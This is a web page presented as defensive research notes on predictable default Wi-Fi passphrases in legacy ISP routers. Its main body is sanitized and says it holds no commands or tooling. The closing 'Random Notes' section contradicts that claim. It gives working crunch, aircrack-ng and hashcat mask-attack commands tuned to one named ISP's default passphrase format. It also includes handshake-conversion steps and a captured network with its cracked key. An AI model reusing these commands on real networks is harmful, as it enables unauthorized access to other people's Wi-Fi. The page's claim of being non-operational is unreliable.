---
layout: page
permalink: /wifi_security
---
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https:; script-src 'self'; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
<meta name="referrer" content="no-referrer">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<meta http-equiv="Cross-Origin-Embedder-Policy" content="require-corp">
<meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin">
<meta http-equiv="Cross-Origin-Resource-Policy" content="same-origin">
<meta http-equiv="Expect-CT" content="max-age=86400, enforce">

<link rel="icon" href="/favicon.png" type="image/png">
<link rel="stylesheet" href="{{ 'css/main.css' | relative_url }}">

<script src="{{ '/assets/js/nacl.min.js' | relative_url }}"></script>
<script src="{{ '/assets/js/openpgp.min.js' | relative_url }}"></script>
<script src="{{ '/assets/js/secrets.min.js' | relative_url }}"></script>


<script src="{{ '/assets/js/stego.js' | relative_url }}"></script>
<script src="{{ '/assets/js/encrypt_decrypt.js' | relative_url }}"></script>
<script src="{{ '/assets/js/gpg.js' | relative_url }}"></script>
<script src="{{ '/assets/js/tor_onion.js' | relative_url }}"></script>
<script src="{{ '/assets/js/shamir.js' | relative_url }}"></script>
<script src="{{ '/assets/js/obfuscator.js' | relative_url }}"></script>
<script src="{{ '/assets/js/copy-to-clipboard.js' | relative_url }}"></script>

---

# ISP Router Default Credential Patterns — Defensive Research Notes

## Purpose

This document records **observational security research** into historical ISP router provisioning practices. It is intended for **education and defense**, not exploitation. No operational instructions, tooling, or step‑by‑step attack guidance are included.

## Scope & Ethics

* **Scope**: Legacy provisioning behaviors observed in some consumer routers deployed by ISPs in earlier generations.
* **Ethics**: Analysis is limited to patterns and risks. Testing should only be performed on equipment you own or are authorized to audit.
* **Non‑Goals**: This document does **not** enable unauthorized access or credential recovery.

## Background

Historically, some ISPs automated Wi‑Fi provisioning at scale. To simplify manufacturing and support, credentials were sometimes derived from device identifiers (e.g., MAC address fragments or serials) combined with fixed formatting rules. While convenient, this approach can reduce effective entropy and introduce predictable structure.

Modern deployments increasingly avoid these pitfalls by using per‑device randomness, server‑side key generation, and post‑install credential rotation.

## Observational Hypothesis (High‑Level)

Across a limited set of legacy devices, the following *structural* characteristics were observed:

* **SSID formatting** often included a short hexadecimal or alphanumeric suffix.
* **Default passphrases** appeared to have:

  * Fixed total length
  * Uppercase alphanumeric character set
  * A constant vendor string component
  * One or more positions plausibly derived from device identifiers

> Important: These characteristics describe *structure*, not a method. Apparent correlations do not imply universal applicability.

## Illustrative Examples (Sanitized & Non‑Operational)

The following examples are **redacted and normalized** to demonstrate *pattern structure only*. Identifiers, values, ordering, and quantities have been altered to prevent reuse or inference. No tooling, commands, or procedural detail is included.

* **Example A — SSID Suffix Correlation (Legacy)**

  * Multiple legacy devices broadcast SSIDs following a common vendor prefix with a short alphanumeric suffix.
  * In a limited subset, one character within the default credential *appeared* to align positionally with a character from a public device identifier.
  * The correlation was **inconsistent** across hardware revisions.
  * Interpretation: a *possible positional dependency* in legacy provisioning logic, not a universal rule.

* **Example B — Fixed Length, Fixed Charset**

  * Observed defaults shared the same total length and an uppercase alphanumeric character set.
  * A constant vendor string component was present, with a small number of variable characters.
  * Interpretation: formatting constraints reduced effective entropy regardless of the specific values.

* **Example C — Identifier Broadcast vs. Secret Material**

  * Public identifiers (e.g., SSID/BSSID) exposed fragments that were stable across reboots and resets.
  * In some cases, these fragments overlapped with positions in the default credential *format*.
  * Interpretation: broadcasting stable identifiers can unintentionally leak structure even when values differ.

* **Example D — False Positives & Control Observations**

  * Devices sharing the same SSID naming convention did **not** reliably share credential structure.
  * User‑modified credentials and mixed hardware generations produced coincidental matches.
  * Interpretation: correlation does not imply determinism; controls are required to avoid bias.

> These examples convey *risk patterns* and *design lessons* only. Operational details are intentionally excluded.

## Why This Matters (Risk Analysis)

* **Entropy collapse**: Deriving secrets from identifiers reduces unpredictability.
* **Correlation leakage**: Broadcasting identifiers (e.g., via SSID/BSSID) can leak hints about credential structure.
* **Legacy exposure**: Older hardware may retain factory defaults long after best practices changed.

## Sources of False Positives

* Confirmation bias when only successful correlations are remembered
* User‑changed credentials coincidentally matching expected formats
* Mixed hardware generations under the same SSID naming scheme

## Modern Mitigations (What Changed)

ISPs and vendors now commonly:

* Generate credentials with strong per‑device randomness
* Perform server‑side provisioning
* Force password rotation during setup
* Decouple SSID naming from credential material

These steps significantly reduce the risk described above.

## Defensive Recommendations

For Users:

* Change default Wi‑Fi credentials immediately
* Update router firmware regularly
* Disable legacy SSID naming if configurable

For ISPs/Vendors:

* Avoid deterministic credential derivation
* Treat SSIDs as public identifiers
* Enforce credential rotation and minimum entropy

## Responsible Disclosure Notes

If repeatable weaknesses are confirmed on current hardware:

* Validate on owned/authorized devices
* Minimize detail in public write‑ups
* Coordinate disclosure with the vendor/ISP

## Conclusion

This research highlights why **deterministic provisioning** is risky and why modern randomized approaches are necessary. The value of this work is in documenting lessons learned—not in recreating past failures.

---

*This document is intended for educational and defensive security discussion only.*

---

## Random Notes Eh...

```re
crunch 11 11 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@@COGECO | aircrack-ng -w - -e "$ESSID" *cap
crunch 12 12 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@@@COGECO | aircrack-ng -w - -e "$ESSID" *cap

hashcat -m 22000 -a 3 output.hccapx -1 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
  ?1?1?1?1?1COGECO -o cracked_passwords.txt

hashcat -m 22000 -a 3 output.hccapx -1 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
  ?1?1?1?1?1?1COGECO -o cracked_passwords.txt


hcxpcapngtool -o output.hccapx wpa.cap

sudo apt install hcxtools

hashcat -a 3 --stdout -1 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789   ?1?1?1?1?1COGECO > wordlist_5.txt

hashcat -a 3 --stdout -1 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789   ?1?1?1?1?1?1COGECO > wordlist_6.txt
```

---

```re
  70:7C:63:5B:96:38  COGECO-B9630              WPA (1 handshake)

Second last digit of each mac address matches Default value in SSID Example:

  `70:7C:63:'5'B<-:96:38  COGECO-B<-9630`


COGECO-B9630 - KEY FOUND! [ F7B5DCOGECO ]

COGECO-`B`9630 - KEY FOUND! [ F7`B`5DCOGECO ]
```

---